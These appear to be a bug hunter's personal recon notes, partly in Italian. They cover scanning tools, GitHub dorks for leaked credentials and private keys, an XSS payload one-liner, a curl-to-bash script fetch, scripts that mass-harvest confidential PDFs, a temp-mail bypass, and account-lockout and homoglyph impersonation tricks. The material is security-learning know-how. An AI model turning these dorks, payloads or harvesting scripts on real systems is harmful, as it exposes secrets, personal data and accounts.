_you can use kiterunner or Postman for API recon_ This is a tool designed to brute force API paths

![[Pasted image 20250414224546.png]]

![[Pasted image 20250414224612.png]]
### Automated Scanning (N-Qube) ▶️

Next, run a combination of automated scanners (I call it the "N-Qube" method):

--> use nuclei with AI: 

Tool: [Nuclei AI Prompt](https://github.com/huseyinstif/Nuclei-AI-Prompts)

![[Pasted image 20250223224829.png]]

> https://github.com/reewardius/Nuclei-AI-Prompts

> WebPage with prompts: https://nucleiprompts.com

--> use nucleiFUZZER

> repo: https://github.com/0xKayala/NucleiFuzzer

![[Pasted image 20250209231207.png]]

> sudo  nf -d https://perdoom.com

! **Make sure to install all the tools before running:**

![[Pasted image 20250209233500.png]]


--> use normal nuclei.

```bash
cat alive_subdomains.txt | nuclei -t templates/ -o nuclei_results.txt
```


**In the meanwhile... you could clone github repo and ask advanced ai tools to analyze your samples, and look for sensitive data... or just google dorking in general.**

### 10. Google Dorking 🔮

![None](https://miro.medium.com/v2/resize:fit:700/0*rq-l-jg_XCw-W6Da.png)

Use Google Dorks to find sensitive information. Automate the process with tools like [Bug Bounty Search Engine](https://github.com/Viralmaniar/BigBountyRecon).

## Github Dorking:

### Common github dorking:

- **API Keys & Credentials**
- `filename:.env DB_PASSWORD`
- `filename:config.json AWS_ACCESS_KEY_ID`
- `filename:settings.py SECRET_KEY`
- **Database Connection Strings**
- `filename:.env MYSQL_PASSWORD`
- `filename:database.yml production`
- **SSH & Private Keys**
- `filename:id_rsa`
- `extension:pem private`
- **Cloud & Service Credentials**
- `filename:credentials aws_access_key_id`
- `extension:json google_api_key`

-- look for more github dorks with deepseek and other AIs **this is just the tip of the iceberk**

1. **Use** **`.gitignore`** **to Exclude Sensitive Files**

```
# Example .gitignore entries
.env
*.pem
config.json
database.yml
```

### 🛠️ Essential Tools for Scanning GitHub Leaks

**Automate** and **streamline** your security checks with these open-source tools:

- **TruffleHog**
- **Gitleaks**
- **Detect-Secrets**
- **GitGraber**
- **shhgit**
- **github-dorks**
- **gitrob**
- **git-all-secrets**
- **git-secrets**
- **gittyleaks**
- **GitDorker**

Here's a sample of useful dorks. Simply plug them into GitHub's search bar (or advanced search) and watch the results roll in:

```bash
"api_key"
"api_secret"
"aws_access_key_id"
"aws_secret"
"db_password"
"dbuser"
"filename:.env DB_USERNAME NOT homestead"
"filename:id_rsa"
"filename:wp-config.php DB_PASSWORD"
"password"
"private_key"
"secret"
"token"
"xoxp"
"xoxb"
```

---> look for GOD FATHER ORWA recon! way! with phone too

### _Impact_

1. **Detailed Report**: Showed exactly how the credentials were exposed.
2. **Impact Demonstration**: Proved unauthorized access to their server was possible.
3. **Remediation Suggestions**: Urged them to rotate keys, update `.gitignore`, and audit their code.

### Port Scanning:

#Port_Scanning


_Smap is a port scanner built with shodan.io's free API. It takes same command line arguments as Nmap and produces the same output which makes it a drop-in replacament for Nmap._

> https://github.com/s0md3v/Smap

Main Ports to look for:

![[Pasted image 20250625151938.png]]

gathered only public programs from Bugcrowd:

>https://github.com/sw33tLie/bbscope

```bash
bbscope bc -b <TOKEN> | tee bbscope.txt
```

I manually filtered the collected results from **bbscope.txt** into two different files:

- **ips.txt** – contains IPs and IP ranges.
- **hosts.txt** – contains many websites from public Bug Bounty programs. I have excluded the wildcard domains and only left www sites or main pages.

![](https://ott3rly.com/wp-content/uploads/2024/04/targets.png)

## Scanning Hostnames

The first command I would like to run with nmap is for the hostnames. Let’s pass the **hosts.txt** to nmap and use the following command:

```bash
nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,80,443,53,5060,8080 --open -oX nmap.xml
```

To summarize this command what it does:

- **-iL hosts.txt** – pass file containing hostnames.
- **-Pn** – skips host discovery.
- **–min-rate 5000** – this defines how many packets to send with each request. More will increase speed, but setting it too much could sometimes miss ports or get you blocked by network firewalls.
- **–max-retries 1** – by default, the nmap will do multiple retries, so using 1 or even 0 will increase its speed by a lot.
- **–max-scan-delay 20ms** – the time between each scan.
- **-T4** – nmap speed option. The max could be T5, but if you use T5, you can miss some parts and if you aim for balance between speed and coverage, select the fourth.
- **–top-ports 1000** – this will scan the most common 1000 ports.
- **–exclude-ports 22,80,443,53,5060,8080** – self-explanatory option, I want to exclude those ports, that I usually find using [httpx](https://github.com/projectdiscovery/httpx), so I do not need to do this two times.
- **–open** – to check only those who are not filtered or closed.
- **-oX nmap.xml** – saves the output in XML format.

**As I gave a test for 500 hosts, it only took around 6 minutes to scan. Not all of them they up and running, but still it’s a pretty good result, considering the coverage and the speed.**

![](https://ott3rly.com/wp-content/uploads/2024/04/nmap-1-1024x128.png)

After getting the XML output, the next thing to do is parse that XML file into the **IP:PORT** format. I have made a [custom script](https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh) on gist for this.

**It takes the file from standard input and uses xmlint library just to get ipv4 IPs and for each found IP, it will also match the port which is open and prints the output to the screen. Let’s try to use it directly by a terminal:**

```bash
curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.xml
```

It will request the script from the gist, and execute using bash while passing the **nmap.xml** file. The final result will look similar to this (I am using random IPs and ports here):

```
123.321.22.100:1333
13.32.222.13:1334
123.31.222.103:1335
...
```

Additionally what you can do, is also pipe that to **httpx** and check for the status code:

```bash
curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.xml | httpx-toolkit -mc 200
```

## Scanning IP Ranges

**Now try to do the same command for the IPs and IP ranges file. I will use the same options, except the output file will be different:**

```bash
nmap -iL ips.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,80,443,53,5060,8080 --open -oX nmap2.xml
```

_For this current run, it took more than **5 hours** to scan more than **23,000** IP addresses. At least for me, it’s good to leave scans like this in the background while I am sleeping.

![](https://ott3rly.com/wp-content/uploads/2024/04/nmap-2.png)


If you are using the same provider for [BXSS](https://ott3rly.com/hunting-blind-xss-on-the-large-scale-part-2/), [OOB server](https://ott3rly.com/mass-blind-server-side-testing-setup-for-bug-bounty/), or just hosting your website, your account could be suspended for using port scans and you will lose access to everything!<mark style="background: #FFB86CA6;"> Instead, I will only recommend using port scanning for a selected few targets from your local computer – like main websites for various programs.</mark>

**or use naabu.**

```bash
naabu -list sub-list.txt -top-ports 1000 -exclude-ports 80,443,21,22,25 -o ports.txt


naabu -list sub-list.txt -p - -exclude-ports 80,443,21,22,25 -o ports.txt
```

### Tip #2

**Ideally, you want to scan those main targets once or twice a day using a cron job from your computer.** 

To make the process simpler, I recommend checking [crontab.guru](https://crontab.guru/) website. It will explain the syntax of cron in an easily understandable manner. Next, open crontab in your terminal and paste the script that you will want to run periodically:

```bash
crontab -e
```

You will need to paste the value from **crontab.guru** website and your desired command. For instance, this cron job will run my specified nmap command each day every 12th hour:

![](https://ott3rly.com/wp-content/uploads/2024/04/crontab-1024x318.png)

## Tip 3:

try using [jfscan](https://github.com/nullt3r/jfscan) tool by **nullt3r**. Basically, it merges **nmap** with **masscan** and will make your life much easier, but keep in mind, that you are <mark style="background: #FFB8EBA6;">trading coverage for speed.</mark>

## Search for PII:

Fire up **[Uncover Tool](https://github.com/projectdiscovery/uncover)** against **target.com**:

```bash
uncover -q "target.com" -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt
```

While going through the IPs, **one IP** stood out. It contained a file named **password_control**. Intrigued, I opened it and BOOM 💥 — there it was:

> _**Sensitive Information**_ _like_ _**usernames**_ _and_ _**hashed passwords**_ _of their internal systems! 🔐_

![None](https://miro.medium.com/v2/resize:fit:700/0*jKseO9RApypBXdrO.png)

### 🧐 Verifying Ownership of the IP

Before jumping to conclusions, it was crucial to verify whether the IP belonged to **target.com**.

1. **WHOIS Lookup**: I ran a quick `whois` on the IP, but it didn't give much useful information.
2. **Cross-Browser Testing**:

- When I opened the IP in **Firefox**, it prompted for credentials 🔑.
- But in **Chrome**, it gave **direct access** to the files! 😲

## VHOST Hunting Section:


Virtual host (VHost) enumeration is an advanced way to find more live hosts belonging to your target! 🤑

Quick guide:
1) Install and use a tool like ffuf
```
2) ffuf -u $TARGET -H "Host: FUZZ.$TARGET" -w /path/to/wordlist
```
3) Now filter for live hosts in the results

Example👇

https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt

> Wordlist:/usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt


### Bonus:

# ! This is basic Recon, So if you're really looking for it, see in the actual file for SDTO 

### 8.1 Subdomain Takeover:

Use **Subzy** to detect potential subdomain takeovers:

```css
subzy run --targets alive_subdomains.txt
```

### 8.2 Broken Link Hijacking:

Run **SocialHunter** to find broken links:

```typescript
socialhunter -f alive_subdomains.txt
```

**Github Link:** **[Socialhunter](https://github.com/utkusen/socialhunter)**

### 8.3 Cross-Site Scripting (XSS):

Check for XSS vulnerabilities using **ParamSpider**:

```bash
paramspider -d target.com | qsreplace '"/><script>confirm(1)</script>' > xss.txt
cat xss.txt | while read url; do curl --silent --path-as-is --insecure "$url" | grep -qs "<script>confirm(1)" && echo "$url \\033[0;31mVulnerable\\n" || echo "$url \\033[0;32mNot Vulnerable\\n"; done
```

				Modify the payload as needed to suit your target.

**Github Link:****[ParamSpider](https://github.com/devanshbatham/ParamSpider)**

## Simple Temp Mail Bypass Method:

![[Pasted image 20250426103416.png]]

![[Pasted image 20250426103434.png]]

_First, understand the security behind it:

**When you sign up, the server doesn’t just trust your email. It checks if the domain is live via DNS before accepting and sending emails.** Most temp mail services use dead domains, so they fail this check.

Bypass Trick:
**Use Burp Collaborator to create a "live" email!**

Example:
Burp link:
https://2twpagov8v5bsbmdwktmtkyygpmia9yy.oastify.com

Make it look like an email:
admin123@2twpagov8v5bsbmdwktmtkyygpmia9yy.oastify.com

Since the domain is live (thanks to Burp), you’ll bypass the email validation easily!

Pro Tip:
Use Burp Collaborator emails — **they’re not just for bypassing, they also help you spot SSRF vulnerabilities!**


## What To do, after a list of Active BB Programs

![[Z - IMMAGINI/domains.txt]]

🌈Download all bug bounty programs domains in scope items 🎯

😉Get a full list of domains from active bug bounty programs across platforms like HackerOne, Bugcrowd, Intigriti, and more – all in one place!💥

👇Step 1: Download the domains.txt file

📂Step 2: Extract only main/root domains

```bash
cat domains.txt | awk -F ' ' '{print $(NF-1)"."$NF}' | grep -Eo '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' | sort -u > main_domains
```

📂Step 3: Extract all IP addresses:

```bash
grep -Eo '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' domains.txt > ips.txt
```

-- Then follow LegionHunter Methodology.

## Email Misconfiguration Leads to Account Lockout:

#easy_boounty :

**How You can earn easy bounty from Change email function. I got $350 for this submission, and I Found this misconfigration on many companies.**

Steps To Reproduce:

```bash
1-Log into your account.

2-Go to profile.

3-Change your email To victim email.

4-Victim try to Sign Up with his email.

5-Will show error, Email already exist.

6-If victim try to login with his email, it will show The Password is Wrong.

7-Now victim try to Rest the password of his email, Won't get any notification for it.

8-Now You can say, this misconfigration will lead to lockout any victims account, To login or Sign up Into his account. Via his email address.

/*The system doesn't verify who's the true admin of the account.*\

```

## Same Username, Different Letters? Account Creation with Lookalike Usernames:

by: https://strangerwhite.medium.com/same-username-different-letters-account-creation-with-lookalike-usernames-e370b2a7d5e3

#easy_boounty
## How The Website Works (Normally)

**So, like most websites, this one lets users create accounts with a unique username and email address. Simple, right?**

It checks for:

- Duplicate usernames ✅
- Duplicate emails ✅

Now here’s the catch: It checks _what’s written_, but not _how it looks_.

## 1. Homoglyph Attacks: When Identical-Looking Letters Are Different

## What’s a Homoglyph?

A **homoglyph** is a character that _looks_ like another but is technically different in Unicode. For example:

- `apple` (Latin letters)
- `аpple` (Cyrillic 'а' U+0430 + Latin 'apple')

_To the human eye, they appear the same, but computers treat them as completely different characters._

## How Scammers Use This

Attackers register accounts with homoglyphs to impersonate legitimate users. Examples:

✅ **Phishing Logins:**

- Real: `twitter`
- Fake: `twіtter` (Ukrainian 'і' U+0456)

_I’m not sure why it’s showing such a big difference in the blog — maybe it’s due to Medium’s security — but this is how it actually looks_

![](https://miro.medium.com/v2/resize:fit:875/1*dBjbD85__bd3NsGlatix1Q.png)

**_You can use chatGPT to Generate a Homoglyph Username Variant_**

>Generate a homoglyph variant of the username "[TARGET_USERNAME]".

# 2. Case-Sensitive Confusion: “Admin” vs “admin”

## The Problem with Uppercase Letters

Some systems treat usernames as **case-sensitive**, meaning:

- `Support` ≠ `support`
- `Admin` ≠ `admin`

## Real-World Example: GitHub’s Old Vulnerability

In 2017, a researcher found that GitHub allowed:

- `Octocat` (legit)
- `octocat` (new account)

## Why It’s Dangerous

- Users may **unknowingly interact with fake accounts**.
- Some platforms **don’t detect homoglyph abuse**.
- **Confusion**: For both users and admins

## How Platforms Can Prevent This

✔ **Normalize usernames** (convert all letters to a single script).  
✔ **Block mixed-script usernames** (e.g., Latin + Cyrillic).  
✔ **Warn users** about visually similar accounts.

![[Pasted image 20250618153157.png]]

						Marked as P5 and got bounty too

**P.S.** If you’re a developer, check out these tools to detect homoglyphs:

- [Unicode Security Mechanisms](https://unicode.org/reports/tr39/)
- [Confusables Detector](https://www.irongeek.com/homoglyph-attack-generator.php)

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

# Mass Hunting for Leaked Sensitive Documents

#PII #Mass_Testing

## collect target domains from project discovery’s public bug bounty programs [repo](https://github.com/projectdiscovery/public-bugbounty-programs):

```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt
```

_This bash one-liner will curl a public bug bounty program list, filter programs which include bounty, select only domains from parameters and saves the output into **targets.txt** file. We will use this file later for our hunt._

### 2# BBSCOPE tool from sw33tLie

If you want to save time greatly, you could use [this tool](https://github.com/sw33tLie/bbscope) alone. But keep in mind, _that you will probably need to inspect collected data manually._

It does cover the domain targets from many major bug bounty platforms:

**Hackerone**

`bbscope h1 -a -u <username> -t <token> -b > bbscope-h1.txt`

**Bugcrowd**

`bbscope bc -t <token> -b > bbscope-bc.txt`

**Intigriti**

`bbscope it -t <token> -b > bbscope-it.txt`

**Note:** Manually inspect all findings and add them to **targets.txt** for the domains without wildcards, and to the **targets-wildcards.txt** — **domains with wildcards.**

_**Optional: Arkadiyt’s bounty targets data**_ There is another repository on GitHub, that could be used to build a **target list** for _all programs_. The **Arkadiyt’s bug bounty targets data** repository is **constantly being updated every 30 minutes**! Unfortunately, there is _**no filter**_ if the domains from this repository are from _VDP_ or _BBP_ (at least for `domains.txt` and `wildcards.txt`). If you want to be a **good Samaritan**, and don’t care this much about **getting paid**, you could follow this step — but keep in mind that your **target list will be filled with VDP targets**!


```bash
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt" | anew targets.txt

curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt" | anew target-wildcards.txt
```

_**Preparing VPS for Mass Hunting PDF Files**_ If you follow my stories, you will probably know that I’m a **big fan of Axiom**. I have already covered how it is possible to _back up VPS instances_ which can be **replicated and scaled** for bug bounties. 

To hunt for **sensitive PDF files on a mass scale**, I want to have the `pdftotext` CLI utility on _each Axiom instance_. With this utility, I’ll be able to **convert PDF to text** and later `grep` for **sensitive words** (potential _leaks_ or _PII_). 

For this particular case, _ChatGPT_ helped me a bit to **prepare an Axiom instance**.

  
![](https://ott3rly.com/wp-content/uploads/2023/12/Screenshot-from-2023-12-10-17-43-06.png)

As we can see, to have **pdftotext** on each instance, I need to use `sudo apt-get install poppler-utils` command to install on the targeted machine. When installed and backed up, it will be almost ready to use.

## Scanning the Targets For Big Bucks

I have also created custom module which include one-liner which **collects sensitive data from PDFs with wildcards included:**

```bash
[{
	"command":"for i in `cat input | gau --subs --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done",
	"ext":"txt"
}]
```

							~/.axiom/modules/gau-pdfs.json
## Breve Spiegazione del file:

### **Spiegazione passo per passo:**
 
1. `cat input` Legge l'elenco di domini o URL contenuti nel file `input`.
    
2. `gau --subs --threads 16` Usa _GetAllUrls_ per ottenere una lista di URL storici (da Wayback Machine, CommonCrawl ecc.) con sottodomini, multithreading abilitato per velocizzare.
    
3. `grep -Ea '\.pdf'` Filtra gli URL per trovare solo quelli che puntano a file `.pdf`.
    
4. `httpx -silent -mc 200` Verifica se gli URL PDF rispondono con codice HTTP 200 (cioè esistono e sono accessibili).
    
5. `for i in \`**...\**`; do` Cicla ogni URL PDF trovato.
    
6. `curl -s "$i"` Scarica silenziosamente il contenuto del PDF.
    
7. `pdftotext -q - -` Converte il contenuto PDF in testo (senza output a terminale).
    
8. `grep -Eaiq 'internal use only|confidential'` Cerca nel testo parole chiave come _“internal use only”_ o _“confidential”_ in maniera insensibile a maiuscole/minuscole.
    
9. **Se trovato,** `echo $i | tee output` Stampa l’URL che contiene testo sensibile e lo salva nel file `output`.
    
### 🗃️ **Output finale:**

_Nel file `output` troverai solo gli URL PDF validi **che contengono dati sensibili** secondo i pattern specificati.

#### _You can turn on your creative thinking and try to modify this script to your own need. For example, using katana, instead of gau, or checking for other sensitive words, using other extensions and etc. Using own creative approach gives the most bounties!
## Tip

📜 **Script Esteso in Bash per Hunting su Documenti Sensibili** (By Copilot)

## TEST


```python
# Colori ANSI
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RESET='\033[0m'

# Parole chiave sensibili
KEYWORDS='internal use only|confidential|do not distribute|proprietary|restricted|not for public|secret|personal data|classified|sensitive information'

# Estensioni file target
EXTENSIONS='\.pdf|\.docx?|\.xlsx?'

# Estrazione URL validi
echo -e "${CYAN}[+] Estrazione degli URL da input...${RESET}"
cat input | gau --subs --threads 16 | grep -Ei "$EXTENSIONS" | httpx -silent -mc 200 > urls.txt

# Scansione contenuti
while read -r url; do
    ext="${url##*.}"
    echo -e "${CYAN}[>] Scanning: $url${RESET}"

    if [[ "$ext" == "pdf" ]]; then
        if curl -s "$url" | pdftotext -q - - | grep -Eaiq "$KEYWORDS"; then
            echo -e "${GREEN}[✓] PDF sensibile trovato:${RESET} ${url}" | tee -a hits.txt
        fi
    elif [[ "$ext" =~ ^docx?$ || "$ext" =~ ^xlsx?$ ]]; then
        if curl -s "$url" -o tmpfile && strings tmpfile | grep -Eaiq "$KEYWORDS"; then
            echo -e "${RED}[!] Documento Office sensibile trovato:${RESET} ${url}" | tee -a hits.txt
        fi
        rm -f tmpfile
    fi
done < urls.txt

```

### 📦 Risultato:

- PDF trovati con contenuti sensibili → **verde**
    
- Documenti Office riservati → **rosso**
    
- Stato e log → **azzurro**
    

TO DO - **Se vuoi, possiamo modularizzarlo in un file `.sh` pronto all’uso e con flag da terminale tipo `-k` per parole chiave personalizzate o `-e` per nuove estensioni. Oppure posso aiutarti a portarlo in Python con output colorato e threading avanzato. Ti piace l’idea? 🔍💣🌐 Fammi sapere se ti serve anche il salvataggio dei contenuti estratti o uno script per il parsing dei metadati. Possiamo salire di livello! 🚀🧠💾 Vuoi anche log con timestamp per ogni match? Lo piazzo subito.✨📅**

### 🛠️ **Requisiti**

- `gau`
    
- `httpx`
    
- `pdftotext` (`poppler-utils`)
    
- `grep`, `curl`, `strings`

————————————————————————————————————

Finally, use **axiom-scan** for targets with subdomains:

`axiom-scan targets-wildcards.txt -m gau-pdfs -anew pdf-leak-findings.txt`

If you want to use it on targets without subdomains included, it is required to modify the module by removing –subs flag:

```bash
[{
	"command":"for i in `cat input | gau --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done",
	"ext":"txt"
}]
```

							~/.axiom/modules/gau-pdfs.json

And run command for targets without wildcard subdomains:

> `axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt`

## Final Habits

_I’ve covered how it’s possible to do bug bounties on a mass scale using a pretty creative approach. You could try to do this_ **for other document types such as doc, docx, xlsx and etc. as it is many other places where some oopsies could occur.**

.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:..:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:..:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._

# Hunt Habits


## 🛑 Bonus: Avoid Scope Traps

Some platforms bait beginners with attractive rewards but super tight scopes.

## 📌 bounty-targets-data + Custom Script

Get instant alerts when new bug bounty programs go live on HackerOne, Bugcrowd, Intigriti, and YesWeHack — before everyone else.

Use [**bounty-targets-data**](https://github.com/arkadiyt/bounty-targets-data), an open-source repo that maintains updated JSON scope lists across all platforms.

```bash
curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json | jq '.[].program_url'
```

**Pro Setup**:  
• Compare yesterday’s list with today’s  
• Get notified via Telegram or desktop popup when a new program drops  
• Auto-add fresh scopes into your recon pipeline

## **🧙‍♂️ bounty-targets-data (by assetnote)**

A goldmine JSON list of all public bug bounty programs. Great for scripting.

> https://github.com/arkadiyt/bounty-targets-data

**🔁 Schedule cronjobs:**

1. subfinder on your targets
2. httpx to check what’s alive
3. nuclei to scan newly added stuff

———————————————————————————————————————————
## 🧪 Practice Makes Perfect

Pick 5–10 solid targets, learn their stack, test them deeply. Stick with those for 1–2 weeks.

_It’s not about hitting 50 programs at once.

# 3. Recon & Discovery

## 🔴 90% Hunters:

Run one-liner recon commands and expect magic.

Use basic subdomain enumeration (subfinder, assetfinder).

Rely on default wordlists (SecLists).

## 🟢 10% Elite Hunters:

Create custom wordlists from JS files & API docs.

<span style="color:rgb(192, 0, 0)">Analyze wayback data, GitHub leaks, and cloud misconfigurations.</span>

Chain multiple tools into a custom pipeline.

# 4. Vulnerability Hunting

## 🔴 90% Hunters:

Focus on low-hanging fruit (Reflected XSS, outdated software).

<span style="color:rgb(255, 192, 0)">Ignore business logic bugs.</span>

Submit duplicate reports frequently.

## 🟢 10% Elite Hunters:

Find high-impact, unique bugs (OAuth misconfigurations, IDOR-to-Account Takeover).

Exploit API vulnerabilities (GraphQL, JWT, BOLA)

Chain multiple bugs into a full exploit (e.g., Open Redirect → SSRF → AWS Access).

## 🟢 10% Elite Hunters:

Explore less tested assets: mobile apps, APIs, third-party integrations.

Read documentation, changelogs, API docs for hints.

Check acquisitions, subdomains, old infrastructure for weak points.

📌 Example: Instead of targeting www.target.com, they go for:

```
help.target.com (support systems)

old.target.com (legacy applications)

partner.target.com (third-party integrations)
```


## 🟢 10% Elite Hunters:

**TEST on: DOR, SSRF, CSRF, BOLA, JWT, GraphQL, OAuth & Business Logic**

Focus on business logic bugs (IDOR, BOLA, mass assignment).

Test OAuth misconfigurations, JWT manipulation, GraphQL exploits.

Understand how permissions work and find broken access controls.

📌 Example:

Instead of looking for basic XSS, an elite hunter will:

Check if account deletion endpoints can be abused.

**Look for privilege escalation by modifying role permissions.**

**Exploit weak JWT implementations for authentication bypass.**

# How to Go from 90% to 10%?

✅ Stop relying only on automation—think like a developer.  
✅ Learn business logic flaws—understand how systems work.  
✅ Write detailed reports—impact matters more than the bug itself.   
				.<span style="color:rgb(146, 208, 80)">Like writing suggested fixes</span>
✅ Hunt on less crowded platforms—private programs & startups.  
✅ Stay consistent & document findings—success takes time.

**Recon isn’t optional**. It’s the reason you’ll get a bug — or burn out.

But here’s what nobody tells you:

> Recon is less about tools — and more about **timing**, **psychology**, and **focus**.

If you’re still doing “wide recon” on 50 programs, hitting dead subdomains, or blindly scanning stale assets, you’re already behind.

Today, I’ll show you how real hackers do recon in 2025, with:

- Real scripts
- A focused system
- Automation that spots bugs before others even wake up

# Why Most Hunters Fail at Recon 🧠

They treat it like a checklist:  
**subfinder** → **httpx** → **nuclei** → **repeat**

But think about this:  
If everyone is running the same tools in the same order… how will you find something new?

The truth is, most bounty hunters:

- Scan too many targets without context
- Don’t track changes or new exposures
- Miss early-stage bugs by arriving too late

> Recon isn’t a tool. It’s a radar. The smarter it is, the earlier you detect bugs.  
> Don’t just collect tools — create workflows.

## Step 1: Know What You’re Looking For 🕵️‍♂️

Before tools, ask:  
What kind of bugs are you good at finding?

- **APIs**? → Look for JSON responses, Swagger files, mobile endpoints.
- **Access Control**? → Focus on apps with login panels, multiple user roles.
- **Logic Bugs**? → Go for startups, commerce, fintech.

This shapes your recon like a sniper scope — not a shotgun.


## Step 2: Build Your Radar — Passive Recon ⚙️

Passive recon gives you signals without touching the target.

Use These Tools:

1. **bounty-targets-data :** Monitors all public bounty scopes across HackerOne, Bugcrowd and Intigriti.

```bash
for platform in hackerone bugcrowd intigriti; do echo -e "\n\033[1;36m==============================\n[$platform Programs]\n==============================\033[0m"; curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/${platform}_data.json" | jq -r '.[].url'; done
```

- **Iterates through each platform** listed (`hackerone`, `bugcrowd`, `intigriti`).
    
- For each platform, it:
    
    - Prints a nicely formatted header showing which platform’s data is being processed.
        
    - Uses `curl` to download the corresponding JSON data file from the GitHub repo `arkadiyt/bounty-targets-data`.
        
    - Pipes the JSON into `jq` to extract and print the `url` field from each entry, which represents the target programs' domains or scopes.


- Compare today vs yesterday.
- Script it. Alert yourself.

2. **chaos.projectdiscovery.io :** Massive subdomain data of bounty programs. Free recon goldmine.

```bash
chaos-client -d example.com -key $CHAOS_KEY | httpx -silent
```

- Finds active subdomains under wildcard scopes.
- Targets dev/staging environments that others skip.

## How to Install:

```bash
# Install prerequisites
sudo apt update && sudo apt install -y python3-pip

# Install chaos-client
pip3 install chaos-client

# Verify installation
chaos-client --version
```
## Alternative: 

```bash
go install -v github.com/projectdiscovery/chaos-client/cmd/chaos-client@latest
```

### **Get a Chaos API Key**

1. Sign up at [Chaos ProjectDiscovery](https://chaos.projectdiscovery.io/)
    
2. Get your API key from the dashboard
    
3. Set it as an environment variable:

```bash
echo 'export CHAOS_KEY="your_api_key_here"' >> ~/.bashrc
source ~/.bashrc
```

## Step 3: Active Recon That Actually Works ⚡

Once you know what’s alive and in scope, go active — but smart.

**My Recon Combo (2025-Ready):**

subfinder -d target.com -all | anew alive.txt  
httpx -l alive.txt -mc 200,403 -t 80 -o live.txt  
nuclei -l live.txt -t ~/nuclei-templates/ -o scan.txt

> _Don’t run this once. Cron it. Watch for changes.  
> Bugs don’t just exist — they appear when changes happen._


## Real Recon Script I Use 🧪

```bash
#!/bin/bash

input=$1
date=$(date +%F)

if [ -f "$input" ]; then
    # If input is a file, read each domain from the file
    while read -r domain; do
        mkdir -p ~/recon/$domain/$date
        subfinder -d $domain -silent | tee ~/recon/$domain/$date/subs.txt
        httpx -l ~/recon/$domain/$date/subs.txt -silent | tee ~/recon/$domain/$date/alive.txt
        nuclei -l ~/recon/$domain/$date/alive.txt -o ~/recon/$domain/$date/nuclei.txt
    done < "$input"
else
    # If input is a single domain
    domain=$input
    mkdir -p ~/recon/$domain/$date
    subfinder -d $domain -silent | tee ~/recon/$domain/$date/subs.txt
    httpx -l ~/recon/$domain/$date/subs.txt -silent | tee ~/recon/$domain/$date/alive.txt
    nuclei -l ~/recon/$domain/$date/alive.txt -o ~/recon/$domain/$date/nuclei.txt
fi

```

`domain=$1` means that the **first argument you pass when running the script will be assigned to the** `domain` **variable**.

So when you run:

```vb
./bashfile target.txt
```

…the value of `$1` becomes `target.txt`, and that's what gets stored in `domain`.

## Add These Tools to Your Pipeline 🧰

- [**gauplus**](https://github.com/bp0lr/gauplus) — Old but gold: find hidden parameters.
- [**waybackurls**](https://github.com/tomnomnom/waybackurls) — Historical recon for juicy files.
- [**github-subdomains**](https://github.com/gwen001/github-subdomains) — For dev leaks from public repos.
- [**katana**](https://github.com/projectdiscovery/katana) — Fast, JS-aware crawling engine.


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

## TOOLS & TIPS BY BRUT SECURITY

_Recently, while surfing the internet using Google Dorks, I came across a new platform known as HUNTR, which is the world's first bug bounty platform for AI & ML._

**🌐 Website**: huntr.com

#### What is Huntr?

- Crowdsourced bug bounty platform that aims to secure open-source projects involving AI and ML workflows, libraries, frameworks, and model file formats.

![None](https://miro.medium.com/v2/resize:fit:700/1*0VJ9srJkjr2Pwg7Eqt_PXw.png)

#### 🔨Top Tools Recommended by Experts

**1️⃣ VulnHuntr**

> https://github.com/protectai/vulnhuntr

- A Python Static Code Analyzer that can be extremely helpful to find zero-day vulnerabilities with the **power of LLMs**
- Better than traditional static code analysis tools
- Helps in the detection of multi-step and complex bypassing attacks
- Already reported many critical 0-day vulnerabilities

![None](https://miro.medium.com/v2/resize:fit:700/1*gYTUpZ6VYg3VNQwgpVZtmw.png)

Source: Github ProtectAI VulnHuntr

**⚠️ Limitations of VulnHuntr**

=> Supports only Python Projects

=> Only the following bug classes are supported by VulnHuntr, namely:

- LFI
- AFO
- RCE
- XSS
- SQLi
- SSRF
- IDOR

**2️⃣ Cybersecurity AI (CAI)**

- An _open Bug Bounty-ready Artificial Intelligence_
- For complete details, refer 👇

> https://github.com/aliasrobotics/cai

**🔖Apply for a CVE**

